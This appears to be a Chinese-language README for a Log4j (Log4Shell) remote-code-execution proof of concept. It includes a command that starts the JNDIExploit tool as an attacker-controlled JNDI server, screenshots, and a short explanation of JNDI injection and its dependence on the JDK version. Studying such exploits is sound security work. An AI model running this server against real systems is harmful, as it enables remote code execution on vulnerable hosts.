# apache_log4j_poc
apache log4j poc—— base Maven

![在这里插入图片描述](https://img-blog.csdnimg.cn/d11b7347edf2480a875ebfdd66ea2670.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)



使用[JNDIExploit](https://github.com/feihong-cs/JNDIExploit)开启jndi服务器：
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.171.1 -l 12344 -p 9999 
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8688b2a947334855ac43d72f79b870a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)

![在这里插入图片描述](https://img-blog.csdnimg.cn/e2e1d9d7530948fdb118ac124cabc012.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)

参考文章：[https://www.codenong.com/f23e29b783ff38df36c9/](https://www.codenong.com/f23e29b783ff38df36c9/)

## 总结
[JNDI注入原理及利用](https://xz.aliyun.com/t/6633#toc-7)
![在这里插入图片描述](https://img-blog.csdnimg.cn/3a4e7244ac8545279e15fef220f64d21.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAU2hhbmZlbmdsYW43,size_20,color_FFFFFF,t_70,g_se,x_16)


```
JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。
```
这个漏洞的利用跟JDK中的配置有很大关系，换句话说跟jdk版本关系很大。
只要JDK版本无漏洞，那么apache log4j的这个RCE就很难利用成功。
